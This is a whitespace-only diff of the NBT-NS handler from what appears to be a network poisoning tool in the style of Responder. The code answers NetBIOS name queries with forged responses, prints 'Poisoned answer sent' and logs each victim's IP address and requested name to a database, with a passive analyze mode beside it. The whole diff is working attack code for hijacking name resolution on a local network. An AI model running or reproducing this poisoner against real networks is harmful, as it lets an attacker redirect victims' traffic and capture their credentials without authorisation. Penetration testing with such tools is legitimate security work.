@@ -23,40 +23,40 @@ from socketserver import BaseRequestHandler
 # NBT_NS Server class.
 class NBTNS(BaseRequestHandler):
 
-	def handle(self):
+    def handle(self):
 
-		data, socket = self.request
-		Name = Decode_Name(NetworkRecvBufferPython2or3(data[13:45]))
-		# Break out if we don't want to respond to this host
-		if RespondToThisHost(self.client_address[0].replace("::ffff:",""), Name) is not True:
-			return None
+        data, socket = self.request
+        Name = Decode_Name(NetworkRecvBufferPython2or3(data[13:45]))
+        # Break out if we don't want to respond to this host
+        if RespondToThisHost(self.client_address[0].replace("::ffff:",""), Name) is not True:
+            return None
 
-		if data[2:4] == b'\x01\x10':  # Analyze Mode
-			if settings.Config.AnalyzeMode:
-				print(text('[Analyze mode: NBT-NS] Request by %-15s for %s, ignoring' % (color(self.client_address[0].replace("::ffff:",""), 3), color(Name, 3))))
-				SavePoisonersToDb({
-							'Poisoner': 'NBT-NS', 
-							'SentToIp': self.client_address[0], 
-							'ForName': Name,
-							'AnalyzeMode': '1',
-						})
-			else:
-				Buffer1 = NBT_Ans()
-				Buffer1.calculate(data)
-				socket.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
-				if not settings.Config.Quiet_Mode:
-					LineHeader = "[*] [NBT-NS]"
-					print(
-						color(
-							f'{LineHeader} Poisoned answer sent to {self.client_address[0].replace("::ffff:", "")} for name {Name} (service: {NBT_NS_Role(NetworkRecvBufferPython2or3(data[43:46]))})',
-							2,
-							1,
-						)
-					)
-				SavePoisonersToDb({
-							'Poisoner': 'NBT-NS', 
-							'SentToIp': self.client_address[0], 
-							'ForName': Name,
-							'AnalyzeMode': '0',
-						})
+        if data[2:4] == b'\x01\x10':  # Analyze Mode
+            if settings.Config.AnalyzeMode:
+                print(text('[Analyze mode: NBT-NS] Request by %-15s for %s, ignoring' % (color(self.client_address[0].replace("::ffff:",""), 3), color(Name, 3))))
+                SavePoisonersToDb({
+                            'Poisoner': 'NBT-NS', 
+                            'SentToIp': self.client_address[0], 
+                            'ForName': Name,
+                            'AnalyzeMode': '1',
+                        })
+            else:
+                Buffer1 = NBT_Ans()
+                Buffer1.calculate(data)
+                socket.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
+                if not settings.Config.Quiet_Mode:
+                    LineHeader = "[*] [NBT-NS]"
+                    print(
+                        color(
+                            f'{LineHeader} Poisoned answer sent to {self.client_address[0].replace("::ffff:", "")} for name {Name} (service: {NBT_NS_Role(NetworkRecvBufferPython2or3(data[43:46]))})',
+                            2,
+                            1,
+                        )
+                    )
+                SavePoisonersToDb({
+                            'Poisoner': 'NBT-NS', 
+                            'SentToIp': self.client_address[0], 
+                            'ForName': Name,
+                            'AnalyzeMode': '0',
+                        })
 
